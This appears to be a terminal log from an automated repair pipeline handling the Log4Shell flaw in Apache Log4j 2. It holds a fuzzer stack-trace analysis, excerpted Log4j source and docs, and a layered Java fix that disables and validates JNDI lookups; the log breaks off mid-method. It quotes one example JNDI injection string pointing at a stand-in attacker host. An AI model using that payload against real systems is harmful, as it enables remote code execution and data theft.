[2;36m                    [0m         [39mA critical security vulnerability has been detected in Apache Log4j [0m[1;36m2[0m[39m through [0m      [2m                [0m
[2;36m                    [0m         [39mfuzzing. The issue involves a Remote JNDI Lookup vulnerability that can potentially[0m [2m                [0m

[2;36m                    [0m         [39mversion in use. The vulnerability is triggered when user-controlled input [0m          [2m                [0m
[2;36m                    [0m         [39mcontaining JNDI lookup expressions is processed by Log4j's message interpolation [0m   [2m                [0m
[2;36m                    [0m         [39mmechanism.[0m                                                                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Description[0m                                                                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Vulnerability Type[0m                                                              [2m                [0m
[2;36m                    [0m         [39mThis is a **Remote JNDI Lookup** vulnerability, classified as a critical security [0m  [2m                [0m
[2;36m                    [0m         [39missue [0m[1;39m([0m[39m`FuzzerSecurityIssueCritical`[0m[1;39m)[0m[39m. JNDI [0m[1;39m([0m[39mJava Naming and Directory Interface[0m[1;39m)[0m[39m [0m  [2m                [0m
[2;36m                    [0m         [39mlookups with attacker-controlled remote URLs represent a severe security risk as [0m   [2m                [0m
[2;36m                    [0m         [39mthey can enable:[0m                                                                    [2m                [0m
[2;36m                    [0m         [39m- Remote code execution [0m[1;39m([0m[39mRCE[0m[1;39m)[0m                                                       [2m                [0m
[2;36m                    [0m         [39m- Exfiltration of sensitive information[0m                                             [2m                [0m
[2;36m                    [0m         [39m- Unauthorized access to system resources[0m                                           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mThe severity is dependent on the JDK version being used, as different versions have[0m [2m                [0m
[2;36m                    [0m         [39mvarying security controls around JNDI lookups.[0m                                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Issue Analysis[0m                                                                  [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mThe stack trace reveals the following execution flow:[0m                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **Entry Point**: The fuzzer test harness [0m                                        [2m                [0m
[2;36m                    [0m         [1;39m([0m[39m`SimpleLoggerFuzzer.fuzzerTestOneInput`[0m[1;39m)[0m[39m invokes a logging operation using [0m        [2m                [0m
[2;36m                    [0m         [39m`[0m[1;35mAbstractLogger.warn[0m[1;39m([0m[1;39m)[0m[39m` at line [0m[1;36m42[0m[39m.[0m                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Log Processing Chain**: The log message travels through Log4j's internal [0m      [2m                [0m
[2;36m                    [0m         [39mprocessing:[0m                                                                         [2m                [0m
[2;36m                    [0m         [39m   - `[0m[1;35mLogger.log[0m[1;39m([0m[1;39m)[0m[39m` → `[0m[1;35mLoggerConfig.log[0m[1;39m([0m[1;39m)[0m[39m` → `[0m[1;35mLoggerConfig.callAppenders[0m[1;39m([0m[1;39m)[0m[39m` → [0m      [2m                [0m
[2;36m                    [0m         [39m`[0m[1;35mAppenderControl.callAppender[0m[1;39m([0m[1;39m)[0m[39m`[0m                                                    [2m                [0m
[2;36m                    [0m         [39m   - The message is then formatted by `[0m[1;35mAbstractOutputStreamAppender.append[0m[1;39m([0m[1;39m)[0m[39m` and [0m  [2m                [0m
[2;36m                    [0m         [39mpassed to layout processing[0m                                                         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **Pattern Layout Processing**: The message undergoes pattern layout formatting:[0m  [2m                [0m
[2;36m                    [0m         [39m   - `[0m[1;35mPatternLayout.toSerializable[0m[1;39m([0m[1;39m)[0m[39m` processes the log event[0m                       [2m                [0m
[2;36m                    [0m         [39m   - `[0m[1;35mPatternFormatter.format[0m[1;39m([0m[1;39m)[0m[39m` and `[0m[1;35mMessagePatternConverter.format[0m[1;39m([0m[1;39m)[0m[39m` handle [0m     [2m                [0m
[2;36m                    [0m         [39mmessage conversion[0m                                                                  [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. **Variable Substitution**: The critical path begins at [0m                          [2m                [0m
[2;36m                    [0m         [39m`[0m[1;35mStrSubstitutor.replace[0m[1;39m([0m[1;39m)[0m[39m`:[0m                                                         [2m                [0m
[2;36m                    [0m         [39m   - The message is processed through `[0m[1;35mStrSubstitutor.substitute[0m[1;39m([0m[1;39m)[0m[39m` [0m[1;39m([0m[39mcalled twice [0m  [2m                [0m
[2;36m                    [0m         [39min the chain[0m[1;39m)[0m                                                                       [2m                [0m
[2;36m                    [0m         [39m   - `[0m[1;35mStrSubstitutor.resolveVariable[0m[1;39m([0m[1;39m)[0m[39m` identifies variables that need resolution[0m   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m. **Lookup Mechanism**: Variable resolution triggers the lookup chain:[0m             [2m                [0m
[2;36m                    [0m         [39m   - `[0m[1;35mInterpolator.lookup[0m[1;39m([0m[1;39m)[0m[39m` at line [0m[1;36m112[0m[39m delegates to specific lookup handlers[0m      [2m                [0m
[2;36m                    [0m         [39m   - `[0m[1;35mJndiLookup.lookup[0m[1;39m([0m[1;39m)[0m[39m` at line [0m[1;36m60[0m[39m is invoked to resolve JNDI expressions[0m        [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m. **Vulnerability Trigger**: The security hook detects the malicious behavior:[0m     [2m                [0m
[2;36m                    [0m         [39m   - `[0m[1;35mNamingContextLookup.lookupHook[0m[1;39m([0m[1;39m)[0m[39m` at line [0m[1;36m61[0m[39m identifies an [0m                   [2m                [0m
[2;36m                    [0m         [39mattacker-controlled remote JNDI URL[0m                                                 [2m                [0m
[2;36m                    [0m         [39m   - The fuzzer's sanitizer raises a `FuzzerSecurityIssueCritical` exception[0m        [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Key Observations[0m                                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **Message Interpolation**: The vulnerability exists in Log4j's message [0m          [2m                [0m
[2;36m                    [0m         [39minterpolation feature, which automatically processes lookup expressions embedded in[0m [2m                [0m
[2;36m                    [0m         [39mlog messages.[0m                                                                       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **JNDI Lookup Handler**: The `JndiLookup` class is specifically designed to [0m     [2m                [0m
[2;36m                    [0m         [39mresolve JNDI expressions, but lacks proper validation of the lookup URLs before [0m    [2m                [0m
[2;36m                    [0m         [39mperforming the operation.[0m                                                           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **String Substitution**: The `StrSubstitutor` component processes variable [0m      [2m                [0m
[2;36m                    [0m         [39mexpressions without adequately sanitizing or validating the lookup destinations.[0m    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. **Security Detection**: The Jazzer fuzzer successfully identified this [0m          [2m                [0m
[2;36m                    [0m         [39mvulnerability through its `NamingContextLookup` hook, which monitors JNDI lookup [0m   [2m                [0m
[2;36m                    [0m         [39moperations.[0m                                                                         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Areas for Investigation[0m                                                         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mTo obtain a comprehensive understanding of this vulnerability, the following [0m       [2m                [0m
[2;36m                    [0m         [39mcomponents should be examined:[0m                                                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **org.apache.logging.log4j.core.lookup.JndiLookup**: [0m                            [2m                [0m
[2;36m                    [0m         [39m   - Implementation of the JNDI lookup functionality[0m                                [2m                [0m
[2;36m                    [0m         [39m   - Input validation mechanisms [0m[1;39m([0m[39mor lack thereof[0m[1;39m)[0m                                  [2m                [0m
[2;36m                    [0m         [39m   - URL parsing and connection handling[0m                                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **org.apache.logging.log4j.core.lookup.Interpolator**:[0m                           [2m                [0m
[2;36m                    [0m         [39m   - How lookups are registered and delegated[0m                                       [2m                [0m
[2;36m                    [0m         [39m   - The complete set of available lookup handlers[0m                                  [2m                [0m
[2;36m                    [0m         [39m   - Security controls around lookup execution[0m                                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **org.apache.logging.log4j.core.lookup.StrSubstitutor**:[0m                         [2m                [0m
[2;36m                    [0m         [39m   - Variable expression parsing logic[0m                                              [2m                [0m
[2;36m                    [0m         [39m   - Pattern matching for lookup expressions[0m                                        [2m                [0m
[2;36m                    [0m         [39m   - Substitution execution flow[0m                                                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. **org.apache.logging.log4j.core.pattern.MessagePatternConverter**:[0m               [2m                [0m
[2;36m                    [0m         [39m   - How log messages are processed and formatted[0m                                   [2m                [0m
[2;36m                    [0m         [39m   - Whether sanitization occurs before substitution[0m                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m. **Configuration Files**:[0m                                                         [2m                [0m
[2;36m                    [0m         [39m   - Default Log4j configuration settings[0m                                           [2m                [0m
[2;36m                    [0m         [39m   - Available options to disable or restrict JNDI lookups[0m                          [2m                [0m
[2;36m                    [0m         [39m   - Security-related configuration parameters[0m                                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m. **User Input Flow**:[0m                                                             [2m                [0m
[2;36m                    [0m         [39m   - How external input reaches the logging statements[0m                              [2m                [0m
[2;36m                    [0m         [39m   - Potential injection points throughout the application[0m                          [2m                [0m
[2;36m                    [0m         [39m   - Data flow from user input to log message processing[0m                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mThis vulnerability affects the core message processing pipeline of Apache Log4j [0m[1;36m2[0m[39m, [0m [2m                [0m
[2;36m                    [0m         [39mmaking it a systemic issue that requires examination of the entire lookup and [0m      [2m                [0m
[2;36m                    [0m         [39msubstitution mechanism.[0m                                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Initial Issue Log[0m                                                                [2m                [0m
[2;36m                    [0m         [39mHere is the initial issue log of the codebase:[0m                                      [2m                [0m

[2;36m                    [0m         [1;36m22[0m[39m: * Lookup a String key to a String value.[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m: * This class represents the simplest form of a string to string map.[0m            [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m: * It has a benefit over a map in that it can create the result on[0m               [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m: * demand based on the key.[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m: * This class comes complete with various factory methods.[0m                       [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m: * If these do not suffice, you can subclass and implement your own matcher.[0m     [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m: * For example, it would be possible to implement a lookup that used the[0m         [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m: * key as a primary key, and looked up the value on demand from the database[0m     [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m: * @version $Id$[0m                                                                 [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m

[2;36m                    [0m         [1;36m38[0m[39m:     * Looks up a String key to a String value.[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * <p>[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     * The internal implementation may use any mechanism to return the value.[0m    [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:     * The simplest implementation is to use a Map. However, virtually any[0m       [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:     * implementation is possible.[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:     * <p>[0m                                                                       [2m                [0m

[2;36m                    [0m         [1;36m45[0m[39m:     * key as a primary key, and looked up the value on demand from the database[0m [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:     * Or, a numeric based implementation could be created that treats the key[0m   [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:     * as an integer, increments the value and return the result as a string -[0m   [2m                [0m

[2;36m                    [0m         [1;36m54[0m[39m:     * [0m[1;35mmap.put[0m[1;39m([0m[32m"number"[0m[39m, new [0m[1;35mInteger[0m[1;39m([0m[1;36m2[0m[1;39m)[0m[1;39m)[0m[39m;[0m                                        [2m                [0m

[2;36m                    [0m         [1;36m37[0m[39m:          <p>[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:            The ContextMapLookup allows applications to store data in the Log4j [0m [2m                [0m
[2;36m                    [0m         [39mThreadContext Map and[0m                                                               [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:            then retrieve the values in the Log4j configuration. In the example [0m [2m                [0m
[2;36m                    [0m         [39mbelow, the application[0m                                                              [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:            would store the current user's login id in the ThreadContext Map [0m    [2m                [0m
[2;36m                    [0m         [39mwith the key [0m[32m"loginId"[0m[39m. During[0m                                                      [2m                [0m

[2;36m                    [0m         [1;36m44[0m[39m:          <[0m[35m/[0m[95mp[0m[39m>[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:          <pre [0m[33mclass[0m[39m=[0m[32m"prettyprint[0m[32m linenums"[0m[39m><![0m[1;39m[[0m[39mCDATA[0m[1;39m[[0m                            [2m                [0m

[2;36m                    [0m         [1;36m169[0m[39m:              Lookups are the means in which parameter substitution is [0m         [2m                [0m
[2;36m                    [0m         [39mperformed. During Configuration initialization[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m170[0m[39m:              an [0m[32m"Interpolator"[0m[39m is created that locates all the Lookups and [0m    [2m                [0m
[2;36m                    [0m         [39mregisters them for use when a variable[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m171[0m[39m:              needs to be resolved. The interpolator matches the [0m[32m"prefix"[0m[39m [0m      [2m                [0m
[2;36m                    [0m         [39mportion of the variable name to a[0m                                                   [2m                [0m

[2;36m                    [0m         [39mvariable.[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m173[0m[39m:            <[0m[35m/[0m[95mp[0m[39m>[0m                                                                [2m                [0m

[2;36m                    [0m         [1;36m176[0m[39m:              the Plugin annotation will be used to match the prefix.  Unlike [0m  [2m                [0m
[2;36m                    [0m         [39mother Plugins, Lookups do not[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m177[0m[39m:              use a PluginFactory. Instead, they are required to provide a [0m     [2m                [0m
[2;36m                    [0m         [39mconstructor that accepts no arguments.[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m178[0m[39m:              The example below shows a Lookup that will return the value of a [0m [2m                [0m

[2;36m                    [0m         [39m## Fix Strategy[0m                                                                     [2m                [0m
[2;36m                    [0m         [39m<fix_strategy>[0m                                                                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Analysis Summary[0m                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mAfter analyzing the evaluation report and code snippets, I've identified the [0m       [2m                [0m
[2;36m                    [0m         [39mcritical security vulnerability [0m[1;39m([0m[39mCVE-[0m[1;36m2021[0m[39m-[0m[1;36m44228[0m[39m - Log4Shell[0m[1;39m)[0m[39m in Apache Log4j [0m[1;36m2[0m[39m. The[0m [2m                [0m
[2;36m                    [0m         [39missue stems from multiple interconnected root causes:[0m                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **Unconditional JNDI Lookup Registration**: JndiLookup is hardcoded in the [0m      [2m                [0m
[2;36m                    [0m         [39mInterpolator's no-arg constructor [0m[1;39m([0m[39mInterpolator.jav[0m[1;92ma:66[0m[1;39m)[0m                            [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **No JNDI URL Validation**: JndiLookup performs remote lookups without [0m          [2m                [0m
[2;36m                    [0m         [39mvalidating URL schemes [0m[1;39m([0m[39mJndiLookup.jav[0m[1;92ma:59[0m[39m-[0m[1;36m60[0m[39m, [0m[1;36m73[0m[39m-[0m[1;36m78[0m[1;39m)[0m                               [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **Message-Level Variable Substitution**: MessagePatternConverter performs [0m       [2m                [0m
[2;36m                    [0m         [39msubstitution on all log messages containing [0m[32m"$[0m[32m{[0m[32m"[0m[39m [0m                                   [2m                [0m
[2;36m                    [0m         [1;39m([0m[39mMessagePatternConverter.jav[0m[1;92ma:71[0m[39m-[0m[1;36m72[0m[1;39m)[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. **Default-Enabled State**: ENABLE_JNDI flag defaults to true without system [0m     [2m                [0m
[2;36m                    [0m         [39mproperty integration[0m                                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mThe vulnerability allows attackers to inject malicious JNDI lookup expressions like[0m [2m                [0m
[2;36m                    [0m         [39m`$[0m[1;39m{[0m[39mjndi:ldap:[0m[35m/[0m[35m/attacker.com/[0m[95mexploit[0m[1;39m}[0m[39m` into log messages, leading to remote code [0m    [2m                [0m
[2;36m                    [0m         [39mexecution.[0m                                                                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Comprehensive Fix Strategy[0m                                                       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Primary Fix: Disable JNDI Lookup by Default with URL Validation[0m                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mI will implement a defense-in-depth approach combining multiple layers:[0m             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m#### Layer [0m[1;36m1[0m[39m: Change Default JNDI State to Disabled[0m                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Target File**: [0m                                                                   [2m                [0m
[2;36m                    [0m         [39m`core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java`[0m           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Changes**:[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. Change `ENABLE_JNDI` default from `true` to `false` [0m[1;39m([0m[39mline [0m[1;36m31[0m[1;39m)[0m                    [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. Integrate with PropertiesUtil to check system property [0m[32m"log4j2.enableJndi"[0m[39m [0m      [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. Modify the initialization to:[0m                                                    [2m                [0m
[2;36m                    [0m         [39m   ```java[0m                                                                          [2m                [0m
[2;36m                    [0m         [39m   private static final boolean ENABLE_JNDI = [0m[1;35mPropertiesUtil.getProperties[0m[1;39m([0m[1;39m)[0m        [2m                [0m
[2;36m                    [0m         [39m       [0m[1;35m.getBooleanProperty[0m[1;39m([0m[32m"log4j2.enableJndi"[0m[39m, false[0m[1;39m)[0m[39m;[0m                             [2m                [0m
[2;36m                    [0m         [39m   ```[0m                                                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Rationale**: This makes the vulnerability opt-in rather than opt-out. Users who [0m  [2m                [0m
[2;36m                    [0m         [39mlegitimately need JNDI lookups must explicitly enable it via system property, [0m      [2m                [0m
[2;36m                    [0m         [39msignificantly reducing attack surface.[0m                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m#### Layer [0m[1;36m2[0m[39m: Add JNDI URL Scheme Validation[0m                                        [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Target File**: [0m                                                                   [2m                [0m
[2;36m                    [0m         [39m`core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java`[0m           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Changes**:[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. Add a new validation method before line [0m[1;36m73[0m[39m:[0m                                      [2m                [0m
[2;36m                    [0m         [39m   ```java[0m                                                                          [2m                [0m
[2;36m                    [0m         [39m   private boolean [0m[1;35misAllowedJndiUrl[0m[1;39m([0m[39mString jndiName[0m[1;39m)[0m[39m [0m[1;39m{[0m                              [2m                [0m
[2;36m                    [0m         [39m       [0m[35m/[0m[35m/[0m[39m Only allow local Java JNDI resources[0m                                      [2m                [0m
[2;36m                    [0m         [39m       [0m[35m/[0m[35m/[0m[39m Block any URL-style lookups with :[0m[35m/[0m[35m/[0m[39m pattern[0m                              [2m                [0m
[2;36m                    [0m         [39m       if [0m[1;39m([0m[1;35mjndiName.contains[0m[1;39m([0m[32m"://"[0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                              [2m                [0m
[2;36m                    [0m         [39m           return false;[0m                                                            [2m                [0m
[2;36m                    [0m         [39m       [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m       [0m[35m/[0m[35m/[0m[39m Only allow java: scheme or simple names[0m                                   [2m                [0m
[2;36m                    [0m         [39m       if [0m[1;39m([0m[1;35mjndiName.contains[0m[1;39m([0m[32m":"[0m[1;39m)[0m[39m && ![0m[1;35mjndiName.startsWith[0m[1;39m([0m[32m"java:"[0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [39m           return false;[0m                                                            [2m                [0m
[2;36m                    [0m         [39m       [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m       return true;[0m                                                                 [2m                [0m
[2;36m                    [0m         [39m   [0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m   ```[0m                                                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. Modify the `lookup` method [0m[1;39m([0m[39mlines [0m[1;36m52[0m[39m-[0m[1;36m64[0m[1;39m)[0m[39m to validate before performing lookup:[0m   [2m                [0m
[2;36m                    [0m         [39m   ```java[0m                                                                          [2m                [0m
[2;36m                    [0m         [39m   public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                   [2m                [0m
[2;36m                    [0m         [39m       if [0m[1;39m([0m[39mkey == null || !ENABLE_JNDI[0m[1;39m)[0m[39m [0m[1;39m{[0m                                           [2m                [0m
[2;36m                    [0m         [39m           return null;[0m                                                             [2m                [0m
[2;36m                    [0m         [39m       [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m       [0m                                                                             [2m                [0m
[2;36m                    [0m         [39m       [0m[35m/[0m[35m/[0m[39m Security validation: reject remote JNDI URLs[0m                              [2m                [0m
[2;36m                    [0m         [39m       if [0m[1;39m([0m[39m![0m[1;35misAllowedJndiUrl[0m[1;39m([0m[39mkey[0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [39m           [0m[1;35mLOGGER.warn[0m[1;39m([0m[32m"Invalid JNDI URI - [0m[32m{[0m[32m}[0m[32m"[0m[39m, key[0m[1;39m)[0m[39m;[0m                               [2m                [0m
[2;36m                    [0m         [39m           return null;[0m                                                             [2m                [0m
[2;36m                    [0m         [39m       [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m       [0m                                                                             [2m                [0m
[2;36m                    [0m         [39m       try [0m[1;39m{[0m                                                                        [2m                [0m
[2;36m                    [0m         [39m           InitialContext ctx = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                               [2m                [0m
[2;36m                    [0m         [39m           return [0m[1;39m([0m[39mString[0m[1;39m)[0m[39m [0m[1;35mctx.lookup[0m[1;39m([0m[1;35mconvertJndiName[0m[1;39m([0m[39mkey[0m[1;39m)[0m[1;39m)[0m[39m;[0m                        [2m                [0m
[2;36m                    [0m         [39m       [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mNamingException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [39m           return null;[0m                                                             [2m                [0m
[2;36m                    [0m         [39m       [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m   [0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m   ```[0m                                                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Rationale**: Even if JNDI is enabled, this prevents remote lookups by blocking [0m   [2m                [0m
[2;36m                    [0m         [39mURL-style JNDI references [0m[1;39m([0m[39mldap:[0m[35m/[0m[35m/[0m[39m, rmi:[0m[35m/[0m[35m/[0m[39m, dns:[0m[35m/[0m[35m/[0m[39m, etc.[0m[1;39m)[0m[39m. This follows the secure [0m [2m                [0m
[2;36m                    [0m         [39mpattern seen in [0m[1;35mFileUtils.fileFromURI[0m[1;39m([0m[1;39m)[0m[39m which whitelists safe schemes.[0m              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m#### Layer [0m[1;36m3[0m[39m: Remove Default JndiLookup Registration[0m                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Target File**: [0m                                                                   [2m                [0m
[2;36m                    [0m         [39m`core/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.java`[0m         [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Changes**:[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. Remove line [0m[1;36m66[0m[39m: `[0m[1;35mlookups.put[0m[1;39m([0m[32m"jndi"[0m[39m, new [0m[1;35mJndiLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;` from the no-arg [0m        [2m                [0m
[2;36m                    [0m         [39mconstructor[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. Keep only the safe lookups [0m[1;39m([0m[39msys and env[0m[1;39m)[0m[39m:[0m                                        [2m                [0m
[2;36m                    [0m         [39m   ```java[0m                                                                          [2m                [0m
[2;36m                    [0m         [39m   public [0m[1;35mInterpolator[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                          [2m                [0m
[2;36m                    [0m         [39m       this.defaultLookup = new [0m[1;35mMapLookup[0m[1;39m([0m[39mnew HashMap<String, String>[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m           [2m                [0m
[2;36m                    [0m         [39m       [0m[1;35mlookups.put[0m[1;39m([0m[32m"sys"[0m[39m, new [0m[1;35mSystemPropertiesLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [39m       [0m[1;35mlookups.put[0m[1;39m([0m[32m"env"[0m[39m, new [0m[1;35mEnvironmentLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [39m       [0m[35m/[0m[35m/[0m[39m JndiLookup removed from default registration[0m                              [2m                [0m
[2;36m                    [0m         [39m   [0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m   ```[0m                                                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Rationale**: This ensures JndiLookup is not automatically available even through [0m [2m                [0m
[2;36m                    [0m         [39mthe plugin discovery mechanism in the parameterized constructor. Users who need [0m    [2m                [0m
[2;36m                    [0m         [39mJNDI must explicitly register it, combined with the Layer [0m[1;36m1[0m[39m check.[0m                  [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m#### Layer [0m[1;36m4[0m[39m: Restrict convertJndiName Logic[0m                                        [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Target File**: [0m                                                                   [2m                [0m
[2;36m                    [0m         [39m`core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java`[0m           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Changes**:[0m                                                                        [2m                [0m
[2;36m                    [0m         [39mModify the `convertJndiName` method [0m[1;39m([0m[39mlines [0m[1;36m73[0m[39m-[0m[1;36m79[0m[1;39m)[0m[39m to be more restrictive:[0m           [2m                [0m
[2;36m                    [0m         [39m```java[0m                                                                             [2m                [0m
[2;36m                    [0m         [39mprivate String [0m[1;35mconvertJndiName[0m[1;39m([0m[39mString jndiName[0m[1;39m)[0m[39m [0m[1;39m{[0m                                   [2m                [0m
